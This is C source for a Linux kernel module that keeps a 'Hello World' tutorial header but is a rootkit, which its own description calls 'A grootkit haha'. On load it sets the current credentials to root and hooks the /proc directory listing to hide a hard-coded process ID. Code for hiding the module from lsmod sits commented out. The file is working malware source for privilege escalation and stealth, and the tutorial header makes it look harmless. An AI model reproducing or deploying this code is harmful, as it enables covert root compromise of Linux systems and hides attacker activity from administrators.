/**
 * @file    hello.c
 * @author  Derek Molloy
 * @date    4 April 2015
 * @version 0.1
 * @brief  An introductory "Hello World!" loadable kernel module (LKM) that can display a message
 * in the /var/log/kern.log file when the module is loaded and removed. The module can accept an
 * argument when it is loaded -- the name, which appears in the kernel log files.
 * @see http://www.derekmolloy.ie/ for a full description and follow-up descriptions.
*/

#include <linux/init.h>   // Macros used to mark up functions e.g., __init __exit
#include <linux/module.h> // Core header for loading LKMs into the kernel
#include <linux/kernel.h> // Contains types, macros, functions for the kernel

#include <asm/unistd.h>
#include <linux/cred.h>
#include <linux/fs.h>
#include <linux/kallsyms.h>
#include <linux/kobject.h>
#include <linux/list.h>
#include <linux/proc_fs.h>
#include <linux/rbtree.h>
#include <linux/slab.h>
#include <linux/string.h>
#include <linux/syscalls.h>
#include <linux/sysfs.h>
#include <linux/uaccess.h>
#include <linux/unistd.h>
#include <linux/version.h>
#include <linux/limits.h>
#include <linux/delay.h>
#include <linux/version.h>
#include <linux/namei.h>

MODULE_LICENSE("GPL");                              ///< The license type -- this affects runtime behavior
MODULE_AUTHOR("Moder amn security flbank elmasry"); ///< The author -- visible when you use modinfo
MODULE_DESCRIPTION("A grootkit haha");              ///< The description -- see modinfo
MODULE_VERSION("0.1");                              ///< The version of the module

static char *name = "world";                                        ///< An example LKM argument -- default value is "world"
module_param(name, charp, S_IRUGO);                                 ///< Param desc. charp = char ptr, S_IRUGO can be read/not changed
MODULE_PARM_DESC(name, "The name to display in /var/log/kern.log"); ///< parameter description
static char *proc_to_hide = "7821";
static struct file_operations proc_fops;
static struct file_operations *backup_proc_fops;
static struct inode *proc_inode;
static struct path p;

struct dir_context *backup_ctx;

static int rk_filldir_t(struct dir_context *ctx, const char *proc_name, int len,
                        loff_t off, u64 ino, unsigned int d_type)
{
    if (strncmp(proc_name, proc_to_hide, strlen(proc_to_hide)) == 0)
        return 0;

    return backup_ctx->actor(backup_ctx, proc_name, len, off, ino, d_type);
}

struct dir_context rk_ctx = {
    .actor = rk_filldir_t,
};

int rk_iterate_shared(struct file *file, struct dir_context *ctx)
{
    int result = 0;
    rk_ctx.pos = ctx->pos;
    backup_ctx = ctx;
    result = backup_proc_fops->iterate(file, &rk_ctx);
    ctx->pos = rk_ctx.pos;

    return result;
}

/** @brief The LKM initialization function
 *  The static keyword restricts the visibility of the function to within this C file. The __init
 *  macro means that for a built-in driver (not a LKM) the function is only used at initialization
 *  time and that it can be discarded and its memory freed up after that point.
 *  @return returns 0 if successful
 */
static int __init rootkit_init(void)
{
    printk(KERN_INFO "rootkit says: Greatings %s starting engine!\n", name);

    /*invisble kernel module*/
    // list_del_init(&__this_module.list);
    // kobject_del(&THIS_MODULE->mkobj.kobj);
    // printk("invisible: module loaded\n");
    /*end invisible lsmod kernel*/

    /* grant root access */
    struct cred *creds = prepare_creds();
    if (!creds)
        printk(KERN_INFO "can not grant root acces\n");
    else
    {
        creds->uid.val = creds->euid.val = 0;
        creds->gid.val = creds->egid.val = 0;
        commit_creds(creds);
        printk(KERN_INFO "rootkit says: Granted toot access\n", name);
    }


    /*hide process from list of proccesess*/
    if (kern_path("/proc", 0, &p))
        return 0;

    /* get the inode*/
    proc_inode = p.dentry->d_inode;

    /* get a copy of file_operations from inode */
    proc_fops = *proc_inode->i_fop;
    /* backup the file_operations */
    backup_proc_fops = proc_inode->i_fop;
    /* modify the copy with out evil function */
    proc_fops.iterate = rk_iterate_shared;
    /* overwrite the active file_operations */
    proc_inode->i_fop = &proc_fops;

    return 0;
}

/** @brief The LKM cleanup function
 *  Similar to the initialization function, it is static. The __exit macro notifies that if this
 *  code is used for a built-in driver (not a LKM) that this function is not required.
 */
static void __exit rootkit_exit(void)
{
    printk(KERN_INFO "rootkit says: Parking %s Engine off!\n", name);
    if(kern_path("/proc", 0, &p))
        return;
    proc_inode = p.dentry->d_inode;
    proc_inode->i_fop = backup_proc_fops;

}

/** @brief A module must use the module_init() module_exit() macros from linux/init.h, which
 *  identify the initialization function at insertion time and the cleanup function (as
 *  listed above)
 */
module_init(rootkit_init);
module_exit(rootkit_exit);
